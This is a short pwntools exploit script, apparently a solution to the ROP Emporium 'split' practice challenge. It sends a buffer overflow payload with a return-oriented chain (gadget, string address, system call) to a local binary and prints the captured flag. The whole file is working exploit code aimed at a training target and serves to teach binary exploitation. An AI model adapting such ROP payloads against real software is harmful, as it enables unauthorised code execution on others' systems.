from pwn import *
p = process('./split')
p.recvuntil('Contriving a reason to ask user for data...\n')
p.sendline("aaaa"*10 + "\x83\x08\x40\x00\x00\x00\x00\x00" + "\x60\x10\x60\x00\x00\x00\x00\x00" + "\x10\x08\x40\x00\x00\x00\x00\x00")
print p.recvuntil("}")         

